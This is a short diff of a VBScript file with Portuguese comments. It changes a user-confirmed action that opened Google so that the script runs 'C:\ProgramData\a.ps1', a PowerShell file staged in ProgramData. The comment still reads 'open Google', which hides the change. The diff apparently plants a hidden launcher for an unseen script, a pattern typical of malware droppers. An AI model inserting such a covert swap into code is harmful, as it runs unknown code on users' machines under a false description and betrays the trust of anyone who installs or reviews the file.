@@ -5,7 +5,7 @@ If resposta = vbYes Then
     ' Abrir o Google
     Dim objShell
     Set objShell = CreateObject("WScript.Shell")
-    objShell.Run "https://www.google.com"
+    objShell.Run "C:\ProgramData\a.ps1"
     Set objShell = Nothing
 Else
     ' Exibir uma mensagem se o botão "Não" for clicado
